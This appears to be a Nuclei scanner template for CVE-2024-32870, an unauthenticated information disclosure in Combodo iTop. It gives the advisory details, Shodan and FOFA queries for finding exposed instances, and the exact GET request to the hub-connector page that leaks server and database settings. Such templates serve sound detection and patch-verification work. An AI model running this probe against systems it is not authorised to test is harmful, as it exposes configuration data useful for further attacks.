id: CVE-2024-32870

info:
  name: iTop Hub Connector - Information Disclosure
  author: DhiyaneshDk
  severity: medium
  description: |
    Combodo iTop is a simple, web based IT Service Management tool. Server, OS, DBMS, PHP, and iTop info (name, version and parameters) can be read by anyone having access to iTop URI. This issue has been patched in versions 2.7.11, 3.0.5, 3.1.2, and 3.2.0.
  impact: |
    Unauthenticated attackers can access sensitive server, database, and iTop configuration information.
  remediation: |
    Update iTop to version 2.7.11, 3.0.5, 3.1.2, or 3.2.0 or later.
  reference:
    - https://www.synacktiv.com/en/advisories/multiple-vulnerabilities-on-itop
    - https://github.com/Combodo/iTop/security/advisories/GHSA-rfjh-2f5x-qxmx
    - https://nvd.nist.gov/vuln/detail/CVE-2024-32870
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cve-id: CVE-2024-32870
    cwe-id: CWE-200
    epss-score: 0.17512
    epss-percentile: 0.94886
    cpe: cpe:2.3:a:combodo:itop:*:*:*:*:*:*:*:*
  metadata:
    vendor: combodo
    product: itop
    shodan-query: html:"iTop login"
    fofa-query: body="iTop login"
  tags: cve,cve2024,itop,disclosure,unauth,exposure,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/pages/exec.php?exec_module=itop-hub-connector&exec_page=launch.php&target=inform_after_setup"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'database_settings'
          - 'database_version'
          - 'database_settings'
          - 'instance_host'
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100b98ecb365665df381182a61d2d62fb05466453b6e13ca1b144685879e0e4e6d902203f7514a88211f156dc7d7f57ee974ab54f52ba8a584a064f51e6e6745546397f:922c64590222798bb761d5b6d8e72950